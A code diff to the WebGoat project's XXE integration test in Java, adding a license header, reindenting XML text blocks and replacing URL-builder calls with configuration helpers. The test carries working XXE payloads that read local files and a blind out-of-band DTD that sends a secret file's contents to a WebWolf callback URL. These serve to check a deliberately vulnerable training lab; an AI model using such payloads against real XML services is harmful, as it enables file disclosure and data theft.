@@ -1,3 +1,7 @@
+/*
+ * SPDX-FileCopyrightText: Copyright © 2019 WebGoat authors
+ * SPDX-License-Identifier: GPL-2.0-or-later
+ */
 package org.owasp.webgoat.integration;
 
 import io.restassured.RestAssured;
@@ -9,20 +13,20 @@ public class XXEIntegrationTest extends IntegrationTest {
 
   private static final String xxe3 =
       """
-      <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE user [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;test</text></comment>
-      """;
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE user [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;test</text></comment>
+""";
   private static final String xxe4 =
       """
-     <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE user [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;test</text></comment>
-     """;
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE user [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;test</text></comment>
+""";
   private static final String dtd7 =
       """
-      <?xml version="1.0" encoding="UTF-8"?><!ENTITY % file SYSTEM "file:SECRET"><!ENTITY % all "<!ENTITY send SYSTEM 'WEBWOLFURL?text=%file;'>">%all;
-      """;
+<?xml version="1.0" encoding="UTF-8"?><!ENTITY % file SYSTEM "file:SECRET"><!ENTITY % all "<!ENTITY send SYSTEM 'WEBWOLFURL?text=%file;'>">%all;
+""";
   private static final String xxe7 =
       """
-      <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE comment [<!ENTITY % remote SYSTEM "WEBWOLFURL/USERNAME/blind.dtd">%remote;]><comment><text>test&send;</text></comment>
-      """;
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE comment [<!ENTITY % remote SYSTEM "WEBWOLFURL/USERNAME/blind.dtd">%remote;]><comment><text>test&send;</text></comment>
+""";
 
   private String webGoatHomeDirectory;
 
@@ -57,7 +61,7 @@ public class XXEIntegrationTest extends IntegrationTest {
    */
   private String getSecret() {
     String secretFile = webGoatHomeDirectory.concat("/XXE/" + getUser() + "/secret.txt");
-    String webWolfCallback = new WebWolfUrlBuilder().path("landing").attackMode().build();
+    String webWolfCallback = webWolfUrlConfig.url("landing");
     String dtd7String = dtd7.replace("WEBWOLFURL", webWolfCallback).replace("SECRET", secretFile);
 
     // upload DTD
@@ -66,7 +70,7 @@ public class XXEIntegrationTest extends IntegrationTest {
         .relaxedHTTPSValidation()
         .cookie("WEBWOLFSESSION", getWebWolfCookie())
         .multiPart("file", "blind.dtd", dtd7String.getBytes())
-        .post(new WebWolfUrlBuilder().path("fileupload").build())
+        .post(webWolfUrlConfig.url("fileupload"))
         .then()
         .extract()
         .response()
@@ -75,9 +79,9 @@ public class XXEIntegrationTest extends IntegrationTest {
 
     // upload attack
     String xxe7String =
-        xxe7.replace("WEBWOLFURL", new WebWolfUrlBuilder().attackMode().path("files").build())
+        xxe7.replace("WEBWOLFURL", webWolfUrlConfig.url("files"))
             .replace("USERNAME", this.getUser());
-    checkAssignment(url("xxe/blind"), ContentType.XML, xxe7String, false);
+      checkAssignment(webGoatUrlConfig.url("xxe/blind"), ContentType.XML, xxe7String, false);
 
     // read results from WebWolf
     String result =
@@ -85,7 +89,7 @@ public class XXEIntegrationTest extends IntegrationTest {
             .when()
             .relaxedHTTPSValidation()
             .cookie("WEBWOLFSESSION", getWebWolfCookie())
-            .get(new WebWolfUrlBuilder().path("requests").build())
+            .get(webWolfUrlConfig.url("requests"))
             .then()
             .extract()
             .response()
@@ -105,10 +109,10 @@ public class XXEIntegrationTest extends IntegrationTest {
   public void runTests() throws IOException {
     startLesson("XXE", true);
     webGoatHomeDirectory = webGoatServerDirectory();
-    checkAssignment(url("xxe/simple"), ContentType.XML, xxe3, true);
-    checkAssignment(url("xxe/content-type"), ContentType.XML, xxe4, true);
-    checkAssignment(
-        url("xxe/blind"),
+      checkAssignment(webGoatUrlConfig.url("xxe/simple"), ContentType.XML, xxe3, true);
+      checkAssignment(webGoatUrlConfig.url("xxe/content-type"), ContentType.XML, xxe4, true);
+      checkAssignment(
+              webGoatUrlConfig.url("xxe/blind"),
         ContentType.XML,
         "<comment><text>" + getSecret() + "</text></comment>",
         true);
